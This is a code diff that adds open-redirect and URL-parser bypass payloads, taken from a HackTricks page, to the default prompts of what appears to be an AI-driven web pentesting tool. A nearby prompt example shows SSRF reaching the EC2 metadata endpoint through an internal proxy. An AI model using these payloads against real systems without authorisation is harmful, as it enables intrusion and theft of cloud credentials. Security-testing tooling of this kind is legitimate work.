@@ -1,5 +1,64 @@
 import { type CustomPrompt } from "@/engine/types";
 
+// https://hacktricks.boitatech.com.br/pentesting-web/open-redirect
+const urlBypassTechniques = `
+Here are some less common techniques for bypassing URL parsers that might be useful:
+
+Using a whitelisted domain or keyword
+
+\`\`\`
+www.whitelisted.com.evil.com redirect to evil.com
+https://www.target.com//example.com/ could redirect to //example.com/ if parsed incorrectly
+https://www.target.com%09.example.com redirect to example.com
+https://www.target.com%252e.example.com redirect to example.com
+\`\`\`
+
+Using "//" to bypass "http" blacklisted keyword
+
+\`\`\`
+//google.com
+\`\`\`
+
+Using "https:" to bypass "//" blacklisted keyword
+
+\`\`\`
+https:google.com
+\`\`\`
+
+Using "/\\" to bypass:
+
+\`\`\`
+/\\google.com
+\`\`\`
+
+
+Using "@" character, browser will redirect to anything after the "@".
+https://VALID_ORIGIN@ATTACKER_DOMAIN/
+Make sure to use a valid origin of the website we are testing and any attacker domain.
+
+\`\`\`
+https://www.theirsite.com@yoursite.com/
+\`\`\`
+
+Using "%E3%80%82" to bypass "." blacklisted character
+
+\`\`\`
+//google%E3%80%82com
+\`\`\`
+
+Using null byte "%00" to bypass blacklist filter
+
+\`\`\`
+//google%00.com
+\`\`\`
+
+Using parameter pollution
+
+\`\`\`
+?next=whitelisted.com&next=google.com
+\`\`\`
+`
+
 export const defaultCustomPrompts: CustomPrompt[] = [
   {
     id: "1",
@@ -134,6 +193,8 @@ expected. let me go back to that 0.0.0.0 vector - what if I can hit an internal 
 input: http://0.0.0.0:8080/proxy?url=http://169.254.169.254/latest/meta-data/hostname
 output: {"content": "i-0a1b2c3d4e5f67890"}
 JACKPOT! There's an internal proxy service on port 8080 that doesn't have the same restrictions! Got the EC2 instance ID!
+
+${urlBypassTechniques}
 `,
     isDefault: true,
   },
